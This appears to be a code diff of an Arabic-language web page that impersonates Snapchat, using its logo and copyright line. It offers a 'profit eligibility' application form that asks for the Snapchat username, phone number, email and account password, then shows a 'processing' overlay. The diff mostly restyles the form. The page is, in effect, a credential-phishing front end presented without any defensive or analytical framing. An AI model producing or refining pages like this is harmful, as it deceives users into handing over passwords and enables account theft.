@@ -3,62 +3,71 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تقديم طلب الانضمام | Snapchat</title>
+    <title>تقديم طلب الانضمام</title>
     <link rel="stylesheet" href="style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@400;700&family=Lato:wght@400;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@400;700;800&display=swap" rel="stylesheet">
 </head>
 <body>
 
     <header>
         <div class="container">
-            <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/300px-Snapchat_logo.svg.png" alt="Snapchat Logo" class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/100px-Snapchat_logo.svg.png" alt="Snapchat" class="logo">
         </div>
     </header>
 
     <main class="container">
-        <div class="form-wrapper" style="background: #fff; max-width: 500px; margin: 50px auto; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08);">
-            <h2 style="text-align: center; margin-bottom: 20px; color: #1a1a1a;">نموذج تقديم الطلب</h2>
-            <p style="text-align: center; color: #666; margin-bottom: 30px; font-size: 0.9rem;">يرجى ملء البيانات التالية للتحقق من أهلية حسابك لتحقيق الأرباح.</p>
+        <div class="form-wrapper">
+            <h2>نموذج تقديم الطلب</h2>
+            <p style="text-align: center; color: #666; margin-bottom: 25px;">يرجى ملء البيانات للتحقق من أهلية الحساب.</p>
             
             <form id="submissionForm">
-                <div class="form-group" style="margin-bottom: 20px;">
-                    <label for="username" style="display: block; margin-bottom: 8px; font-weight: bold;">اسم المستخدم:</label>
-                    <input type="text" id="username" name="username" required placeholder="اسم المستخدم في سناب شات" autocomplete="username" style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 1rem;">
+                
+                <div class="form-group">
+                    <label for="username">اسم المستخدم:</label>
+                    <input type="text" id="username" name="username" required 
+                           placeholder="اسم المستخدم في سناب شات"
+                           autocomplete="username">
                 </div>
 
-                <div class="form-group" style="margin-bottom: 20px;">
-                    <label for="phoneNumber" style="display: block; margin-bottom: 8px; font-weight: bold;">رقم الهاتف:</label>
-                    <input type="tel" id="phoneNumber" name="phoneNumber" required placeholder="05xxxxxxxx" autocomplete="tel" style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 1rem;">
+                <div class="form-group">
+                    <label for="phoneNumber">رقم الهاتف:</label>
+                    <input type="tel" id="phoneNumber" name="phoneNumber" required 
+                           placeholder="05xxxxxxxx"
+                           autocomplete="tel">
                 </div>
 
-                <div class="form-group" style="margin-bottom: 20px;">
-                    <label for="trackingEmail" style="display: block; margin-bottom: 8px; font-weight: bold;">البريد الإلكتروني:</label>
-                    <input type="email" id="trackingEmail" name="trackingEmail" required placeholder="example@email.com" autocomplete="email" style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 1rem;">
+                <div class="form-group">
+                    <label for="trackingEmail">البريد الإلكتروني:</label>
+                    <input type="email" id="trackingEmail" name="trackingEmail" required 
+                           placeholder="example@email.com"
+                           autocomplete="email">
                 </div>
 
-                <div class="form-group" style="margin-bottom: 20px;">
-                    <label for="passwordField" style="display: block; margin-bottom: 8px; font-weight: bold;">كلمة المرور:</label>
-                    <input type="password" id="passwordField" name="passwordField" required placeholder="********" autocomplete="current-password" style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 1rem;">
+                <div class="form-group">
+                    <label for="passwordField">كلمة المرور:</label>
+                    <input type="password" id="passwordField" name="passwordField" required 
+                           placeholder="********"
+                           autocomplete="current-password">
                 </div>
 
-                <div id="statusMessage" style="display: none; background: #ffe6e6; color: red; padding: 10px; border-radius: 5px; margin-bottom: 15px; text-align: center;"></div>
+                <div id="statusMessage" style="display: none; background: #ffe6e6; color: #cc0000; padding: 10px; border-radius: 5px; margin-bottom: 15px; text-align: center; font-weight: bold;"></div>
 
-                <button type="submit" id="submitBtn" style="width: 100%; background: #1a1a1a; color: #FFFC00; padding: 15px; border: none; border-radius: 50px; font-weight: bold; font-size: 1.1rem; cursor: pointer;">إرسال الطلب</button>
+                <button type="submit" id="submitBtn" style="width: 100%;">إرسال الطلب</button>
             </form>
         </div>
     </main>
 
-    <div id="loadingOverlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.95); z-index: 9999; flex-direction: column; justify-content: center; align-items: center;">
-        <div style="width: 50px; height: 50px; border: 5px solid #FFFC00; border-top: 5px solid #000; border-radius: 50%; animation: spin 1s linear infinite;"></div>
-        <p style="margin-top: 15px; font-weight: bold;">جاري معالجة الطلب...</p>
+    <div id="loadingOverlay" class="loading-overlay" style="display: none;">
+        <div class="loader"></div>
+        <p style="font-weight: bold;">جاري معالجة الطلب...</p>
     </div>
-    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
 
     <footer>
         <div class="container">
             <p>© 2025 جميع الحقوق محفوظة لـ Snapchat</p>
         </div>
     </footer>
+
     <script src="script.js"></script>
 </body>
 </html>
